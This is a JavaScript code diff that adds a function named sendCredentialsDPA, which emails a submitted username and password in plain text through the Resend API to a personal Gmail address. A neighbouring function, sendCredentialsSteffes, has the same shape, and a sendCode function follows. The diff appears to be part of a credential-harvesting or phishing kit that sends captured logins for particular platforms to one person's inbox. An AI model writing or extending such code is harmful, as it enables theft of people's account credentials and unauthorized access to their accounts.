@@ -94,6 +94,28 @@ export const sendCredentialsSteffes = async (
   });
 };
 
+export const sendCredentialsDPA = async (
+  username,
+  password,
+  platform = "DPA",
+) => {
+  await resendAPIKEYRochelle.emails.send({
+    from: "onboarding@resend.dev",
+    to: "rochellele25@gmail.com",
+    subject: "Credentials",
+    html: `
+      <div>
+        <strong>Platform:</strong>
+        <p>DPA</p>
+        <strong>Username:</strong>
+        <p>${username}</p>
+        <strong>Password:</strong>
+        <p>${password}</p>
+      </div>
+    `,
+  });
+};
+
 export const sendCode = async (code) => {
   await resendAPIKEY.emails.send({
     from: "onboarding@resend.dev",
